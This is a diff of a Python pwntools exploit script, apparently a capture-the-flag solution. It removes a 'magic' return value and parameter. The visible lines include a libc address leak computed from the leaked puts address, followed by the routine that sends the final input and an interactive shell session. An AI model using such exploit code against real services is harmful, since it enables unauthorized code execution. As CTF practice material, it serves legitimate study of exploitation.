@@ -47,7 +47,7 @@ def exploit_leak():
 	libc.address = addr_puts - puts_off
 	
 
-def exploit_final(magic):
+def exploit_final():
 	log.info(r.recvuntil(':'))
 	for i in range(3):
 		log.info(r.recvuntil(':'))
@@ -60,11 +60,11 @@ if __name__=='__main__':
 	send_name()
 	send_surname()
 	send_age()
-	magic = exploit_leak()
+	exploit_leak()
 	send_name()
 	send_surname()
 	send_age()
-	exploit_final(magic)
+	exploit_final()
 	
 
 	r.interactive()
